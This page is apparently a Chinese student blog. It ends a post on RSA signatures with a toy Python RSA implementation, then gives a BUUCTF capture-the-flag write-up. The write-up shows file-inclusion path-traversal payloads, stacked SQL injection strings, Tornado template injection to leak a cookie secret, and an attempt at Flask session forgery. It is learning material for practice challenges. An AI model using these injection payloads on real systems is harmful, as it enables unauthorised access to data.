lang=EN-US>mod N</span>，得到“由签名求得的消息”，并将其发送过来的签名内容进行对比，如果两者一致，则签名验证成功，否则签名验证失败。</span></p>
<p><span lang=EN-US>RSA</span><span >签名生成和验证过程如图：</span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image021.jpg" class=""></span></p>
<p><span lang=EN-US >A，<span lang=EN-US >B</span><span>之间进行签名</span></p>
<p><span lang=EN-US >1.</span><span>首先，<span lang=EN-US>A</span>对明文<span lang=EN-US>M</span>进行哈希加密，得到<span lang=EN-US>H</span>（<span lang=EN-US>M</span>），然后将<span lang=EN-US>H</span>（<span lang=EN-US>M</span>）<span lang=EN-US>^d mod N </span>求出签名值<span lang=EN-US>S</span>；</span></p>
<p><span lang=EN-US >2.</span><span lang=EN-US >A</span><span>将<span lang=EN-US>M</span>和<span lang=EN-US>s</span>一齐发送给&lt;spanlang=EN-US&gt;B</span>；</span></p>
<p><span lang=EN-US >3.</span><span lang=EN-US >B</span><span>收到消息后，首先将明文<span lang=EN-US>M</span>进行哈希加密。然后判断<span lang=EN-US>H</span>（<span lang=EN-US>M</span>）<span lang=EN-US>=s^e(mod n)</span>是否成立。如果成立则签名成功。</span></p>
<p><span>注：<span lang=EN-US>d</span>，<span lang=EN-US>e</span>，<span lang=EN-US>n</span>都是<span lang=EN-US>rsa</span>加密算法中的参数。</span></p>
<h2 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>实现</span></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>  <span class="comment">#欧几里得除法</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b: a, b = b, a   <span class="comment">#a先被赋值b的地址于是b再被赋值a的地址</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span><span class="params">(n)</span>:</span>     <span class="comment">#平凡除法</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i== <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test</span><span class="params">(n)</span>:</span>  <span class="comment">#素性检验   Miller-Rabin</span></span><br><span class="line">    q = n - <span class="number">1</span></span><br><span class="line">    k = <span class="number">0</span>           <span class="comment"># 寻找k,q 是否满足2^k*q =n - 1</span></span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">        q = q // <span class="number">2</span></span><br><span class="line">    a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)    <span class="comment"># 如果 a^q mod n= 1, n 可能是一个素数</span></span><br><span class="line">    <span class="keyword">if</span> fast_pow(a, q, n) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>     <span class="comment"># 如果存在j满足 a ^ ((2 ^ j) * q) mod n == n-1, n 可能是一个素数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, k):</span><br><span class="line">        <span class="keyword">if</span> fast_pow(a, (<span class="number">2</span> ** j) * q, n) == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>     <span class="comment"># n 不是素数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_pow</span><span class="params">(b, n, m)</span>:</span>  <span class="comment">#快速幂</span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    tmp = b</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">            ret = ret * tmp % m</span><br><span class="line">        tmp = tmp * tmp % m</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_gcd</span><span class="params">(a, b)</span>:</span>      <span class="comment">#s*a+t*b=1</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_gcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_d</span><span class="params">(phi, e)</span>:</span></span><br><span class="line">    (x, y, r) = ext_gcd(phi, e)    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:   <span class="comment">#return y % ph_n</span></span><br><span class="line">        <span class="keyword">return</span> y + phi     <span class="comment">#直接用加法效率高一丢丢</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span><span class="params">(key_len)</span>:</span>  <span class="comment">#key_len要比消息长度大的多</span></span><br><span class="line">    p = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    q = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"p:"</span>+str(p))</span><br><span class="line">    print(<span class="string">"q:"</span>+str(q))</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p <span class="number">-1</span>) * (q <span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"phi:"</span>+str(phi))</span><br><span class="line">    e = <span class="number">65537</span> <span class="comment">#e取固定值</span></span><br><span class="line">    d = generate_d(phi, e)</span><br><span class="line">    <span class="keyword">return</span> (n ,e, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_prime</span><span class="params">(half_len)</span>:</span>     <span class="comment">#随机产生p、q</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; half_len)    <span class="comment">#求2^half_len之间的大数</span></span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            found = <span class="literal">True</span>        <span class="comment"># 随机性测试</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):       <span class="comment">#5的时候错误率已经小于千分之一</span></span><br><span class="line">                <span class="keyword">if</span> prime_test(n) == <span class="literal">False</span>:</span><br><span class="line">                    found = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found == <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mess2long</span><span class="params">(message)</span>:</span>         <span class="comment">#字符串转HEX</span></span><br><span class="line">	<span class="keyword">return</span> int(message.encode().hex(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long2mess</span><span class="params">(long_num)</span>:</span>        <span class="comment">#解密，HEX转字符串</span></span><br><span class="line">    long_mess = hex(long_num)[<span class="number">2</span>:].replace(<span class="string">"L"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> len(long_mess) % <span class="number">2</span> != <span class="number">0</span>: long_mess = <span class="string">'0'</span> + long_mess</span><br><span class="line">    <span class="keyword">return</span> long_mess    <span class="comment">#binascii.unhexlify(long2mess(plain_num)).decode()</span></span><br><span class="line"></span><br><span class="line">message =input(<span class="string">"input your message:\n"</span>)</span><br><span class="line">mess_num = mess2long(message)</span><br><span class="line">print(<span class="string">"Change form to HEX.STR:"</span>+str(mess_num))</span><br><span class="line">mess_num_length = len(str(mess_num))</span><br><span class="line">(n, e, d) = generate_key(mess_num_length*<span class="number">15</span>)</span><br><span class="line">print(<span class="string">"n:"</span>+str(n))</span><br><span class="line">print(<span class="string">"e:"</span>+str(e))</span><br><span class="line">print(<span class="string">"d:"</span>+str(d))</span><br><span class="line">cipher = fast_pow(mess_num,e, n)</span><br><span class="line">print(<span class="string">"cipher:"</span>+str(cipher))</span><br><span class="line">print(<span class="string">"d:"</span>+str(d))</span><br><span class="line">plain_num = fast_pow(cipher, d, n)</span><br><span class="line">print(<span class="string">"HEX.message is:"</span>)</span><br><span class="line">print(str(int(long2mess(plain_num),<span class="number">16</span>)))</span><br><span class="line">print(<span class="string">"message is:"</span>)</span><br><span class="line">print(binascii.unhexlify(long2mess(plain_num)).decode())</span><br></pre></td></tr></table></figure>

<h2 id="程序运行截图-5"><a href="#程序运行截图-5" class="headerlink" title="程序运行截图"></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>程序运行截图</span></a></h2><p><span lang=EN-US><img src="/2020/02/20/pws/image022.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image023.jpg" class=""></span></p>
<h1 id="综合实验"><a href="#综合实验" class="headerlink" title="综合实验"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>综合实验</span></a></h1><p><span lang=EN-US style='font-family:宋体'>Alice</span>想通过公共信道给<span lang=EN-US style='font-family:宋体'>Bob</span>传输一份秘密文件（文件非常大），又知道，很多人和机构想得到这份文件。如果你是<span lang=EN-US style='font-family:宋体'>Alice</span>，你应该怎样做？请设计一个方案，并编程实现。</p>
<p>程序没编，但是思路想好了。</p>
<h2 id="具体思路："><a href="#具体思路：" class="headerlink" title="具体思路："></a><a name="_Toc28387027"><span style='font-size:16.0pt;font-family:黑体'>具体思路：</span></a></h2><p><span
lang=EN-US style='font-family:宋体'>1.</span>首先，<span lang=EN-US
style='font-family:宋体'>A</span>要发送的明文为<span lang=EN-US style='font-family:宋体'>M</span>，<span
lang=EN-US style='font-family:宋体'>A</span>选择<span lang=EN-US style='font-family:
宋体'>DES</span>加密，则先对明文进行<span lang=EN-US style='font-family:宋体'>DES</span>加密，则加密后的密文为<span
lang=EN-US style='font-family:宋体'>C</span>。</p>
<p><span
lang=EN-US style='font-family:宋体'>2.</span>为了防止有人伪造<span lang=EN-US
style='font-family:宋体'>A</span>对<span lang=EN-US style='font-family:宋体'>B</span>发送消息，则<span
lang=EN-US style='font-family:宋体'>A</span>对密文<span lang=EN-US style='font-family:
宋体'>C</span>进行基于<span lang=EN-US style='font-family:宋体'>RSA</span>的数字签名。首先确定<span
lang=EN-US style='font-family:宋体'>RSA</span>的私钥<span lang=EN-US
style='font-family:宋体'>d</span>，公钥<span lang=EN-US style='font-family:宋体'>e</span>，<span
lang=EN-US style='font-family:宋体'>n</span>；</p>
<p><span
lang=EN-US style='font-family:宋体'>3.</span>首先<span lang=EN-US style='font-family:
宋体'>A</span>对密文进行哈希函数得到<span lang=EN-US style='font-family:宋体'>H(C),</span>然后通过<span
lang=EN-US style='font-family:宋体'>RSA</span>的私钥<span lang=EN-US
style='font-family:宋体'>D</span>进行消息的“解密”，即<span lang=EN-US style='font-family:
宋体'>Si=H(Ci)^d(mod n),</span>随后<span style='font-family:宋体'> <span lang=EN-US>A</span></span>将<span
lang=EN-US style='font-family:宋体'>C</span>与<span lang=EN-US style='font-family:
宋体'>S</span>发送给<span lang=EN-US style='font-family:宋体'>B</span>。</p>
<p><span
lang=EN-US style='font-family:宋体'>4.B</span>收到<span lang=EN-US
style='font-family:宋体'>A</span>发送过来的（<span lang=EN-US style='font-family:宋体'>C,S</span>）之后，进行消息的验证。首先<span
lang=EN-US style='font-family:宋体'>B</span>先计算<span lang=EN-US style='font-family:
宋体'>C</span>对应的哈希值，并且与<span lang=EN-US style='font-family:宋体'>Si^e</span>（<span
lang=EN-US style='font-family:宋体'>mod n</span>）比较是否同余，如果相同，则说明<span lang=EN-US
style='font-family:宋体'>B</span>收到的就是来自<span lang=EN-US style='font-family:宋体'>A</span>发送的消息，发送过程中没有人进行消息的篡改和伪造。</p>
<p><span
lang=EN-US style='font-family:宋体'>5.B</span>然后应用<span lang=EN-US
style='font-family:宋体'>DES</span>的解密算法和密钥进行解密，则得到明文<span lang=EN-US
style='font-family:宋体'>M</span>。</p>
<span lang=EN-US style='font-size:10.5pt;font-family:宋体'>

</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/19/buuctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/19/buuctf/" class="post-title-link" itemprop="url">Buuctf刷题</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-02-19 14:34:59" itemprop="dateCreated datePublished" datetime="2020-02-19T14:34:59+08:00">2020-02-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-02-20 18:09:11" itemprop="dateModified" datetime="2020-02-20T18:09:11+08:00">2020-02-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>疫情四起无法去校，同学说这个平台题目不错，故此刷一刷。</p>
<h1 id="HCTF-2018-WarmUp-1"><a href="#HCTF-2018-WarmUp-1" class="headerlink" title="[HCTF 2018]WarmUp 1"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>[HCTF 2018]WarmUp 1</span></a></h1><p>打开题目发现一张滑稽，按F12提示源码，开始源码审计。</p>
<p>根据源码，大体就是需要绕过文件检查Checkfile函数，如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"滑稽"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先检查非空，是不是字符串，最后经过CheckFile，CheckFile函数中发现有白名单过滤，首先第一个检查是否为字符串，第二传入的参数中是否能<br>通过白名单，然后处理一次传入的参数，将page拼接?之后再截断至?处获取内容检查是否符合白名单，之后先将page参数进行urldecode再按<br>之前的方法处理了一次字符串并检查。总感觉这个逻辑好啰嗦。</p>
<p>看好多人的WP说发现有个urlencode，自然也就想到了二次编码，第一次in_array直接判断page会无法通过，$_page处直接截断第一个?之前的文件查询<br>也就是只能查询合法的两种php文件，?后面被分析为请求，难以利用，第二次in_array处会先进行url解码之后再进行截断，那么我们就有了操作空间，<br>将?二次编码之后可以构造?file=hint.php%253fffffllllaaaagggg<br>这样提交参数的时候服务器解码一次加上赋值处理，变为?file=hint.php?ffffllllaaaagggg?即可绕过</p>
<p>我觉得这个有些多此一举了，直接构造?file=hint.php?../../../../../ffffllllaaaagggg利用文件包含就可以了，何必还二次编码…</p>
<img src="/2020/02/19/buuctf/1.png" class="">

<p>ORZ。</p>
<h1 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>[强网杯 2019]随便注 1</span></a></h1><p>简单注入，1’的时候报错回显暴露了什么不得了的东西，那就顺水推舟</p>
<img src="/2020/02/19/buuctf/2.png" class="">

<p>1’ order by 3#报错，两行</p>
<p>1’ union select 1,2#报错有正则，不区分大小写，感觉很难绕过。</p>
<img src="/2020/02/19/buuctf/3.png" class="">

<p>可以试试堆叠注入，发现确实可行，先查出信息</p>
<p>1’ ;show databases;#查库</p>
<img src="/2020/02/19/buuctf/4.png" class="">

<p>1’ ;show tables;#发现有两个表</p>
<img src="/2020/02/19/buuctf/5.png" class="">

<p>flag在1919810931114514里面。<br>看了别人的wp，有人用的预处理。之前实验修复网站的时候稍微接触了预处理语句，在这里正好试试不是很常用的方法。<br>探明了表结构以后，可以直接列所有信息，用concat来查比较方便，对于关键字的过滤可以使用char或者16进制<br>于是尝试构造:1’;PREPARE kt from concat(char(115,101,108,101,99,116), ‘ * from    <code>｀1919810931114514｀</code> ‘);EXECUTE kt;#<br>分割字符也可以，毕竟是预处理的语法:1’;PREPARE kt from concat(‘sel’,’ect’, ‘ * from <code>｀1919810931114514｀</code> ‘);EXECUTE kt;#<br>也可以，挺方便的。查了查word表好像是空的。</p>
<img src="/2020/02/19/buuctf/6.png" class="">

<h1 id="护网杯-2018-easy-tornado-1"><a href="#护网杯-2018-easy-tornado-1" class="headerlink" title="[护网杯 2018]easy_tornado 1"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>[护网杯 2018]easy_tornado 1</span></a></h1><p>这题思路很明显啦，应该是file?filename=/??????&amp;filehash=?????的格式访问文件，然后hints.php里面提示filehashmd5(cookie_secret+md5(filename))<br>可能需要爆破。但是后来想了想，谁知道他的cookie_secret有多长啊，万一他坑我呢。果不其然，爆破6位数都爆不出来，那爆破是没戏了。<br>换个思路，我们得拿到cookie_secret了，想起题目tornado，可能又是SSTI，试试发现了这个</p>
<img src="/2020/02/19/buuctf/7.png" class="">

<p>发现msg可能可以进行SSTI，试了试2报错了，换了其他的运算（比如：*、%）回显ORZ，好像能用，但是我不是很熟悉这些命令，翻了翻<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">tornado手册</a>和wp，知道了handler指向RequestHandler以及所有ui_methods的参数均有settings。<br>也就是指令构造为</p>
<img src="/2020/02/19/buuctf/8.png" class="">

<p>果然看到了cookie，写个脚本7</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">h = hashlib.md5()</span><br><span class="line">print(hashlib.md5(<span class="string">b'/fllllllllllllag'</span>).hexdigest())<span class="comment">#先打印出/fllllag的值</span></span><br><span class="line">h.update(<span class="string">b'32dd4257-1a9e-4d75-81ec-10ad7ded3a8e3bf9f6cf685a6dd8defadabfb41a03a1'</span>)</span><br><span class="line">print(h.hexdigest())    <span class="comment">#4d6fb7f5c31401c099a57c981e722b66&lt;</span></span><br></pre></td></tr></table></figure>

<p>按照规则一起提交，则有如下</p>
<img src="/2020/02/19/buuctf/9.png" class="">

<h1 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL 1"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>[SUCTF 2019]EasySQL 1</span></a></h1><p>打开题目试试，1能回显，1’不行，很奇怪，测了一些发现好像不是字符型注入，带关键字语句（or and之类的）的好像也不能用，那就试试之前的堆叠注入<br>1;show databases;#查库</p>
<img src="/2020/02/19/buuctf/10.png" class="">

<p>1;show tables;#爆表</p>
<img src="/2020/02/19/buuctf/11.png" class="">

<p>预处理注入：1 ;PREPARE kt from concat(‘sel’,’ect’,’ * ‘);EXECUTE kt;#<br>好像不行，按经验来说应该是prepare、from或者大小写被过滤了，可是不影响啊…郁闷一会，看了看wp<br>才知道结构为$sql = “select “.$post[‘query’].”||flag from Flag”;<br>双引号也被过滤了，翻了很多wp，通用解法为堆叠注入sql_mode=PIPES_AS_CONCAT从而达成将||变为连接效果，这解法真第一次知道，涨姿势了orz。<br>因此标准解法为1;set sql_mode=PIPES_AS_CONCAT;select 1<br>还有由于* 未被过滤，注入*,1会出现select *,1||flag from Flag的结构，也就是select * from Flag直接爆出flag。</p>
<img src="/2020/02/19/buuctf/12.png" class="">

<p>做好笔记，做好笔记，做好笔记。</p>
<h1 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>[HCTF 2018]admin 1</span></a></h1><p>打开题目，似曾相识，于是东看西看，在改密码的界面发现了项目源代码，抓包发现有session，我比较偏向于session伪造，于是翻翻项目查看能否伪造。</p>
<p>在config.py里发现了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span><span class="params">(object)</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>从逻辑上看ckj123可以在没有secret_key的情况下代替其参与加密，我们写个脚本尝试。<br>本来想从app里下手的，没找到，还得自己写。但是我flask老安不上去，没办法，只能去找个脚本了。如下</p>
<pre>

</pre>

<p>环境有误，先放放</p>
